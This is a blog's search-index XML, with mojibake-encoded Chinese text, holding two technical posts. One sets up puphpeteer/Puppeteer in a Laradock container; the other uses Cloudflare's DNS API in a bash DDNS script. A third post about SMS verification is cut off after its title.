<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ä½¿ç”¨ puppeteer æŠ“å–é¡µé¢</title>
      <link href="/post/crawling-pages-with-puppeteer/"/>
      <url>/post/crawling-pages-with-puppeteer/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1ggh34xt3dnj31bs0p0dhs.jpg" alt=""></p><a id="more"></a><h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1 ç®€ä»‹"></a>1 ç®€ä»‹</h1><p><a href="https://github.com/puppeteer/puppeteer" target="_blank" rel="noopener">Puppeteer</a> æ˜¯ç”± Chrome å®˜æ–¹å‡ºå“çš„æ— å¤´æµè§ˆå™¨ï¼ŒåŒç±»å·¥å…·è¿˜æœ‰ PhantomJS å’Œ Seleniumï¼Œä¸è¿‡å‡å·²åœæ­¢ç»´æŠ¤ï¼Œéšç€ Chrome å¸‚åœºä»½é¢çš„æå‡ï¼ŒPuppeteer å·²ç»å¯ä»¥èƒ½å…¼å®¹ç»å¤§å¤šæ•°çš„é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Puppeteer å®ç°è‡ªåŠ¨åŒ–è¡¨å•æäº¤ã€UIæµ‹è¯•ã€é”®ç›˜è¾“å…¥ã€è¯Šæ–­æ€§èƒ½é—®é¢˜ã€æµ‹è¯• Chrome æ‰©å±•ç­‰ã€‚ç”±äº Puppeteer æ˜¯ç”± Node å®ç°çš„ï¼Œæ‰€ä»¥ PHP éœ€è¦ä½¿ç”¨ <a href="https://github.com/nesk/puphpeteer" target="_blank" rel="noopener">puphpeteer</a> åŒ…ã€‚</p><h1 id="2-å®‰è£…"><a href="#2-å®‰è£…" class="headerlink" title="2 å®‰è£…"></a>2 å®‰è£…</h1><p>ç”±äºæˆ‘çš„å¼€å‘ç¯å¢ƒä½¿ç”¨çš„æ˜¯ Laradockï¼Œå› æ­¤å®‰è£…è¿‡ç¨‹ä»¥ Laradock ä¸ºä¾‹ã€‚</p><h2 id="2-1-composer-å¼•å…¥åŒ…"><a href="#2-1-composer-å¼•å…¥åŒ…" class="headerlink" title="2.1 composer å¼•å…¥åŒ…"></a>2.1 composer å¼•å…¥åŒ…</h2><p>åœ¨å®¿ä¸»æœºæ‰§è¡Œ<code>composer require nesk/puphpeteer</code></p><h2 id="2-2-åœ¨å®¹å™¨ä¸­å®‰è£…puphpeteer"><a href="#2-2-åœ¨å®¹å™¨ä¸­å®‰è£…puphpeteer" class="headerlink" title="2.2 åœ¨å®¹å™¨ä¸­å®‰è£…puphpeteer"></a>2.2 åœ¨å®¹å™¨ä¸­å®‰è£…puphpeteer</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨å®¹å™¨ä¸­å®‰è£… nodeï¼Œä½† laradock åŒæ—¶å¯åŠ¨äº† workspace å’Œ php-fpm å®¹å™¨ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨å“ªä¸ªå®¹å™¨ä¸­å®‰è£… node å‘¢ï¼Ÿåœ¨<code>.env</code>ä¸­ï¼Œåªæœ‰ä¸€ä¸ªå°†node å®‰è£…è‡³ workspace ä¸­çš„é…ç½®ã€‚æˆ‘ä¸€å¼€å§‹ä¹Ÿè®¤ä¸ºä¼šä½¿ç”¨ workspace ç¯å¢ƒï¼Œæ‰€ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé‡æ–°æ„å»ºé•œåƒã€è¿è¡Œå®¹å™¨ï¼Œä½†åœ¨è¿è¡Œä¸­å‘ç°ç«Ÿç„¶æç¤º<code>node: command not found</code>ï¼Œæˆ‘ä»¥ä¸ºæ˜¯ www ç”¨æˆ·æ— æ³•è¯»å–åˆ° node å‘½ä»¤ï¼Œæœ€ååœ¨ä»£ç ä¸­è¾“å‡ºè°ƒè¯•ä¿¡æ¯åå‘ç°ï¼Œä»£ç ä½¿ç”¨çš„æ˜¯ php-fpm ç¯å¢ƒï¼Œäºæ˜¯è¿›å…¥ php-fpm ç¯å¢ƒè¿›è¡Œæ‰‹åŠ¨å®‰è£…ã€‚</p><h3 id="2-2-1-ä¿®æ”¹æº"><a href="#2-2-1-ä¿®æ”¹æº" class="headerlink" title="2.2.1 ä¿®æ”¹æº"></a>2.2.1 ä¿®æ”¹æº</h3><p>åœ¨ node å®‰è£…å‰ï¼Œå»ºè®®ä¿®æ”¹ä¸ºå›½å†…é•œåƒæºä»¥åŠ é€Ÿï¼Œæˆ‘ä½¿ç”¨çš„ä¸­ç§‘å¤§æºé€Ÿåº¦è¿˜ä¸é”™</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster main contrib non-free</span><br><span class="line"><span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster-updates main contrib non-free</span><br><span class="line"><span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster-updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster-backports main contrib non-free</span><br><span class="line"><span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian/ buster-backports main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian-security/ buster/updates main contrib non-free</span><br><span class="line"><span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/debian-security/ buster/updates main contrib non-free</span><br></pre></td></tr></table></figure><h3 id="2-2-2-å®‰è£…-node"><a href="#2-2-2-å®‰è£…-node" class="headerlink" title="2.2.2 å®‰è£… node"></a>2.2.2 å®‰è£… node</h3><p>é€šè¿‡<code>cat /etc/issue</code>ç¡®å®šå®¹å™¨ç³»ç»Ÿä¸º Debianï¼Œå› æ­¤æ‰‹åŠ¨æ‰§è¡Œ<code>apt update</code>æ¥æ›´æ–°è½¯ä»¶åº“ï¼Œå¦åˆ™æ— æ³•æ‰¾åˆ° nodejsï¼Œç„¶åæ‰§è¡Œ<code>apt install nodejs</code>å®‰è£…ã€‚</p><h3 id="2-2-3-å®‰è£…puphpeteer"><a href="#2-2-3-å®‰è£…puphpeteer" class="headerlink" title="2.2.3 å®‰è£…puphpeteer"></a>2.2.3 å®‰è£…puphpeteer</h3><p>æ‰§è¡Œ<code>npm install @nesk/puphpeteer</code></p><p>Chrome ç‰ˆæœ¬åœ°å€åœ¨ä»¥ä¸‹ä½ç½®ç®¡ç†ï¼Œå¯ä»¥åœ¨<a href="https://npm.taobao.org/mirrors/chromium-browser-snapshots/" target="_blank" rel="noopener">æ·˜å®é•œåƒ</a>ä¸­æŸ¥æ‰¾æ›´æ–°<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gghahkurdhj30ht06lmxv.jpg" alt=""></p><h3 id="2-2-3-å®‰è£…-php-sockets-æ‰©å±•"><a href="#2-2-3-å®‰è£…-php-sockets-æ‰©å±•" class="headerlink" title="2.2.3 å®‰è£… php-sockets æ‰©å±•"></a>2.2.3 å®‰è£… php-sockets æ‰©å±•</h3><p>é€šè¿‡ pecl æ— æ³•å®‰è£… sockets æ‰©å±•ï¼Œå¯ä»¥åœ¨<a href="https://github.com/php/php-src/releases" target="_blank" rel="noopener">php-src</a>ä¸‹è½½å¯¹åº”ç‰ˆæœ¬æºç ï¼Œè§£å‹å <code>ext/sockets</code>ä¸­æå–å¹¶æ‰“åŒ…æ‰©å±•ï¼Œç„¶åé€šè¿‡<code>docker cp</code>å‘½ä»¤å°†æ‰©å±•åŒ…å¤åˆ¶åˆ°å®¹å™¨ä¸­ç¼–è¯‘å®‰è£…ã€‚</p><h3 id="2-2-4-å®‰è£…ä¾èµ–ç¯å¢ƒ"><a href="#2-2-4-å®‰è£…ä¾èµ–ç¯å¢ƒ" class="headerlink" title="2.2.4 å®‰è£…ä¾èµ–ç¯å¢ƒ"></a>2.2.4 å®‰è£…ä¾èµ–ç¯å¢ƒ</h3><p>æ­¤æ—¶è¿è¡Œæ—¶è¿˜ä¼šæœ‰ä»¥ä¸‹é”™è¯¯æç¤ºï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(node:<span class="number">25272</span>) UnhandledPromiseRejectionWarning: Error: Failed to launch chrome!</span><br><span class="line">/var/www/puppeteer/node_modules/puppeteer/.local-chromium/linux<span class="number">-594312</span>/chrome-linux/chrome: error <span class="keyword">while</span> loading <span class="keyword">shared</span> libraries: libX11-xcb.so<span class="number">.1</span>: cannot open <span class="keyword">shared</span> object file: No such file <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">Fix new Error with </span><br><span class="line">gconf-service libasound2 libatk1<span class="number">.0</span><span class="number">-0</span> libatk-bridge2<span class="number">.0</span><span class="number">-0</span> libc6 libcairo2 libcups2 libdbus<span class="number">-1</span><span class="number">-3</span> libexpat1 libfontconfig1 libgcc1 libgconf<span class="number">-2</span><span class="number">-4</span> libgdk-pixbuf2<span class="number">.0</span><span class="number">-0</span> libglib2<span class="number">.0</span><span class="number">-0</span> libgtk<span class="number">-3</span><span class="number">-0</span> libnspr4 libpango<span class="number">-1.0</span><span class="number">-0</span> libpangocairo<span class="number">-1.0</span><span class="number">-0</span> libstdc++<span class="number">6</span> libx11<span class="number">-6</span> libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç³»ç»Ÿä¸­è¿˜ç¼ºå°‘çš„è¿è¡Œæ‰€éœ€çš„ä¾èµ–ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…å³å¯ä¿®å¤</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install gconf-service libasound2 libatk1<span class="number">.0</span><span class="number">-0</span> libatk-bridge2<span class="number">.0</span><span class="number">-0</span> libc6 libcairo2 libcups2 libdbus<span class="number">-1</span><span class="number">-3</span> libexpat1 libfontconfig1 libgcc1 libgconf<span class="number">-2</span><span class="number">-4</span> libgdk-pixbuf2<span class="number">.0</span><span class="number">-0</span> libglib2<span class="number">.0</span><span class="number">-0</span> libgtk<span class="number">-3</span><span class="number">-0</span> libnspr4 libpango<span class="number">-1.0</span><span class="number">-0</span> libpangocairo<span class="number">-1.0</span><span class="number">-0</span> libstdc++<span class="number">6</span> libx11<span class="number">-6</span> libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget</span><br></pre></td></tr></table></figure><blockquote><p>è§£å†³æ–¹æ¡ˆæ¥è‡ªï¼š<a href="https://github.com/puppeteer/puppeteer/issues/3443" target="_blank" rel="noopener">https://github.com/puppeteer/puppeteer/issues/3443</a></p></blockquote><h3 id="2-2-5-éæ²™ç®±ç¯å¢ƒè¿è¡Œ"><a href="#2-2-5-éæ²™ç®±ç¯å¢ƒè¿è¡Œ" class="headerlink" title="2.2.5 éæ²™ç®±ç¯å¢ƒè¿è¡Œ"></a>2.2.5 éæ²™ç®±ç¯å¢ƒè¿è¡Œ</h3><p>å½“æˆ‘ä»¬ä»¥ä¸ºä¸‡äº‹å¤§å‰æ—¶ï¼Œåˆå¼¹å‡ºäº†è¿™æ ·çš„é”™è¯¯æç¤ºï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(node:<span class="number">28469</span>) UnhandledPromiseRejectionWarnin<span class="variable">g:</span> Error: Failed <span class="keyword">to</span> launch chrome!</span><br><span class="line">[<span class="number">1025</span>/<span class="number">150325.817887</span>:ERROR:zygote_host_impl_linux.<span class="keyword">cc</span>(<span class="number">89</span>)] Running <span class="keyword">as</span> root without --<span class="keyword">no</span>-<span class="keyword">sandbox</span> <span class="keyword">is</span> not supported. See http<span class="variable">s:</span>//crbug.<span class="keyword">com</span>/<span class="number">638180</span>.</span><br></pre></td></tr></table></figure><p>æ ¹æ®é”™è¯¯æç¤ºï¼Œæˆ‘ä»¬æ¥æ·»åŠ <code>--no-sandbox</code>æ¥è¯•ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">Nesk</span>\<span class="title">Puphpeteer</span>\<span class="title">Puppeteer</span>;</span><br><span class="line"></span><br><span class="line">$puppeteer = <span class="keyword">new</span> Puppeteer;</span><br><span class="line">$browser = $puppeteer-&gt;launch([<span class="string">'args'</span>=&gt; [<span class="string">'--no-sandbox'</span>]]);</span><br><span class="line"></span><br><span class="line">$page = $browser-&gt;newPage();</span><br><span class="line">$page-&gt;goto(<span class="string">'https://example.com'</span>);</span><br><span class="line">$page-&gt;screenshot([<span class="string">'path'</span> =&gt; <span class="string">'example.png'</span>]);</span><br><span class="line"></span><br><span class="line">$browser-&gt;close();</span><br></pre></td></tr></table></figure><p>ğŸ¥³ Bingo! Itâ€™s work! </p><h1 id="3-æŠ“å–é¡µé¢"><a href="#3-æŠ“å–é¡µé¢" class="headerlink" title="3 æŠ“å–é¡µé¢"></a>3 æŠ“å–é¡µé¢</h1><p><em>TODO</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> puppeteer </tag>
            
            <tag> puphpeteer </tag>
            
            <tag> laradock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudflare DDNS è®¾ç½®</title>
      <link href="/post/cloudflare-ddns-setting/"/>
      <url>/post/cloudflare-ddns-setting/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gga9bultvsj30ic09674y.jpg" alt=""></p><a id="more"></a><h1 id="1-èƒŒæ™¯"><a href="#1-èƒŒæ™¯" class="headerlink" title="1 èƒŒæ™¯"></a>1 èƒŒæ™¯</h1><p>å®¶ä¸­æœ‰å° NASï¼Œä½†æ²¡æœ‰é™æ€å…¬ç½‘ IPï¼Œæƒ³è¦é€šè¿‡å…¬ç½‘è®¿é—® NAS å’Œè·¯ç”±ç®¡ç†é¡µé¢ï¼Œåªèƒ½é€šè¿‡ DDNS æ¥å®æ—¶ä¸ŠæŠ¥å¹¶ä¿®æ”¹ Cloudflare çš„ DNS è®°å½•ï¼Œé€šè¿‡ä»”ç»†é˜…è¯»<a href="https://api.cloudflare.com/#dns-records-for-a-zone-list-dns-records" target="_blank" rel="noopener">ç›¸å…³æ–‡æ¡£</a>ï¼Œå‘ç°Cloudflareå®Œæ•´æ”¯æŒ DNS çš„å¢åˆ æ”¹æŸ¥ï¼Œä»¥ä¸‹ç®€å•è®°å½•ä¸‹ä½¿ç”¨æ–¹æ³•ï¼š</p><h2 id="1-1-åˆ—å‡ºæ‰€æœ‰"><a href="#1-1-åˆ—å‡ºæ‰€æœ‰" class="headerlink" title="1.1 åˆ—å‡ºæ‰€æœ‰"></a>1.1 åˆ—å‡ºæ‰€æœ‰</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET zones/<span class="symbol">:zone_identifier/dns_records</span></span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records?type=A&amp;name=example.com&amp;content=127.0.0.1&amp;page=1&amp;per_page=20&amp;order=type&amp;direction=desc&amp;match=all"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Key: c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span></span><br></pre></td></tr></table></figure><h2 id="1-2-åˆ›å»ºè®°å½•"><a href="#1-2-åˆ›å»ºè®°å½•" class="headerlink" title="1.2 åˆ›å»ºè®°å½•"></a>1.2 åˆ›å»ºè®°å½•</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST zones/<span class="symbol">:zone_identifier/dns_records</span></span><br></pre></td></tr></table></figure><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records"</span> \</span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> \</span><br><span class="line">     -H <span class="string">"X-Auth-Key: c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> \</span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line">     --data <span class="string">'&#123;"</span><span class="built_in">type</span><span class="string">":"</span>A<span class="string">","</span>name<span class="string">":"</span>example.com<span class="string">","</span>content<span class="string">":"</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">","</span>ttl<span class="string">":120,"</span>priority<span class="string">":10,"</span>proxied<span class="string">":false&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="1-3-è·å–è¯¦æƒ…"><a href="#1-3-è·å–è¯¦æƒ…" class="headerlink" title="1.3 è·å–è¯¦æƒ…"></a>1.3 è·å–è¯¦æƒ…</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET zones/<span class="symbol">:zone_identifier/dns_records/</span><span class="symbol">:identifier</span></span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records/372e67954025e0ba6aaa6d586b9e0b59"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Key: c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span></span><br></pre></td></tr></table></figure><h2 id="1-4-æ›´æ–°è®°å½•"><a href="#1-4-æ›´æ–°è®°å½•" class="headerlink" title="1.4 æ›´æ–°è®°å½•"></a>1.4 æ›´æ–°è®°å½•</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT/PATCH zones/<span class="symbol">:zone_identifier/dns_records/</span><span class="symbol">:identifier</span></span><br></pre></td></tr></table></figure><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PATCH <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records/372e67954025e0ba6aaa6d586b9e0b59"</span> \</span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> \</span><br><span class="line">     -H <span class="string">"X-Auth-Key: c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> \</span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line">     --data <span class="string">'&#123;"</span><span class="built_in">type</span><span class="string">":"</span>A<span class="string">","</span>name<span class="string">":"</span>example.com<span class="string">","</span>content<span class="string">":"</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">","</span>ttl<span class="string">":120,"</span>proxied<span class="string">":false&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="1-5-åˆ é™¤è®°å½•"><a href="#1-5-åˆ é™¤è®°å½•" class="headerlink" title="1.5 åˆ é™¤è®°å½•"></a>1.5 åˆ é™¤è®°å½•</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE zones/<span class="symbol">:zone_identifier/dns_records/</span><span class="symbol">:identifier</span></span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X DELETE <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records/372e67954025e0ba6aaa6d586b9e0b59"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Key: c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span></span><br></pre></td></tr></table></figure><h1 id="2-å®æˆ˜"><a href="#2-å®æˆ˜" class="headerlink" title="2 å®æˆ˜"></a>2 å®æˆ˜</h1><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨æ•´ä¸ª DNS ä¿®æ”¹è¿‡ç¨‹ä¸­ï¼Œè¯·æ±‚ä½“æ˜¯å¤§åŒå°å¼‚çš„ï¼Œå…¶ä¸­ä¸»è¦ç”¨åˆ°äº†ä»¥ä¸‹ 3 ä¸ª key:</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggaaqc1acwj31180aotc0.jpg" alt=""></p><ol><li>zone identifier: å³ Zone IDï¼Œå¯åœ¨ Cloudflare æ§åˆ¶å°é¡µé¢çš„ Overview é¡µé¢å³ä¸‹è§’æˆ– URL è·å–</li><li>dns records identifier: é€šè¿‡ä¸Šè¿°ã€åˆ—å‡ºæ‰€æœ‰ã€‘æ¥å£çš„è¿”å›ç»“æœçš„ id è·å–</li><li>X-Auth-Key: åœ¨ä¸ªäººä¸­å¿ƒçš„ My Profile -&gt; API Tokens -&gt; Global API Key</li></ol><p>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼šX-Auth-Key å¿…é¡»ä½¿ç”¨ Global API Keyï¼Œä½†è¿™æ ·å¯¼è‡´æˆæƒè¿‡å¤§ï¼Œå¯ä»¥åœ¨ My Profile -&gt; API Tokens -&gt; API Tokens -&gt; Create Token åˆ›å»ºç›¸åº”æƒé™çš„ TOKENï¼Œè¿™é‡Œåªéœ€è¦æœ‰ç›¸åº” DNS çš„ç¼–è¾‘æƒé™å³å¯ï¼Œç›¸åº”çš„ï¼Œè¯·æ±‚æ—¶çš„ header ä¹Ÿè¦åšä¿®æ”¹ï¼Œå¦‚</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"https://api.cloudflare.com/client/v4/zones/023e105f4ecef8ad9ca31a8372d0c353/dns_records"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"X-Auth-Email: user@example.com"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"Authorization: Bearer c2547eb745079dac9320b638f5e225cf483cc5cfdda41"</span> <span class="string">\</span></span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¾—åˆ° DDNS è„šæœ¬äº†ï¼ˆä½¿ç”¨å‰è¯·å…ˆå®‰è£… jqï¼Œç¾¤è¾‰å·²è‡ªå¸¦ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Xinyu Shi</span></span><br><span class="line"></span><br><span class="line">zone_identifier=</span><br><span class="line">dns_identifier=</span><br><span class="line">api_token=</span><br><span class="line">domain=</span><br><span class="line">email=</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get dns record of cloudflare</span></span><br><span class="line">record=$(curl -s -X GET <span class="string">"https://api.cloudflare.com/client/v4/zones/<span class="variable">$zone_identifier</span>/dns_records/<span class="variable">$dns_identifier</span>"</span> -H <span class="string">"X-Auth-Email: <span class="variable">$email</span>"</span> -H <span class="string">"Authorization: Bearer <span class="variable">$api_token</span>"</span> -H <span class="string">"Content-Type: application/json"</span> | jq .result.content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get current ip</span></span><br><span class="line">ip=$(curl -s whatismyip.akamai.com)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit records only when IP changes</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;record//\"/&#125;</span> != <span class="variable">$ip</span> ]; <span class="keyword">then</span> </span><br><span class="line">    curl -s -X PATCH <span class="string">"https://api.cloudflare.com/client/v4/zones/<span class="variable">$zone_identifier</span>/dns_records/<span class="variable">$dns_identifier</span>"</span> -H <span class="string">"X-Auth-Email: <span class="variable">$email</span>"</span> -H <span class="string">"Authorization: Bearer <span class="variable">$api_token</span>"</span> -H <span class="string">"Content-Type: application/json"</span> --data <span class="string">'&#123;"type":"A","name":"'</span><span class="variable">$domain</span><span class="string">'","content":"'</span><span class="variable">$ip</span><span class="string">'","ttl":1,"proxied":false&#125;'</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>æœ€åï¼Œè®¾ç½®å®šæ—¶ä»»åŠ¡æ¯åˆ†é’Ÿæ‰§è¡Œå³å¯ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> cloudflare </tag>
            
            <tag> ddns </tag>
            
            <tag> dns </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŸ­ä¿¡éªŒè¯ç”¨æˆ·å®‰å…¨å—ï¼Ÿ</title>
      <link href="/post/sms-verification-safe/"/>
      <url>/post/sms-verification-safe/</url>
      
